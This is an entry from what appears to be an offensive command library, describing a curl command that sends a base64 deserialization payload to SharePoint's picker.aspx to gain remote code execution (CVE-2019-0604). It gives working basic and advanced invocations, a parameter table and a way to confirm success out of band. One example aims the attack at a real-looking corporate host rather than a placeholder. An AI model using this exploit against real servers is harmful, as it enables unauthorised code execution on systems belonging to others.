---
id: cmd-curl-deserial-post
data: >-
  curl -X POST https://target.com/_layouts/15/picker.aspx -d
  "pickerControl=$(cat payload.txt)" -H "Content-Type:
  application/x-www-form-urlencoded"
tags:
  - rce
  - http
  - deserialization
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.277Z'
verified: false
validated: true
submitted: true
---
# curl-send-deserial-payload

## Command

```bash
curl -X POST https://target.com/_layouts/15/picker.aspx -d "pickerControl=$(cat payload.txt)" -H "Content-Type: application/x-www-form-urlencoded"
```

## Description

Sends a malicious base64-encoded deserialization payload via HTTP POST to the SharePoint picker.aspx endpoint, triggering RCE upon deserialization of the 'pickerControl' parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for submission | Yes |
| `-d` | Data payload (e.g., from ysoserial output) | Yes |
| `-H` | Content-Type header for form data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://sdrc.starbucks.com/_layouts/15/picker.aspx -d "pickerControl=AAEAAAD..." -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

```bash
curl -X POST https://target.com/_layouts/15/picker.aspx -d "@payload.txt" --data-urlencode "pickerControl=$(cat payload.txt)" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

HTTP response from the server (may be 200 OK or error), but success is confirmed by command execution (e.g., ping received elsewhere).

## Related

- [[procedures/Exploit-Deserialization-RCE-CVE-2019-0604]]
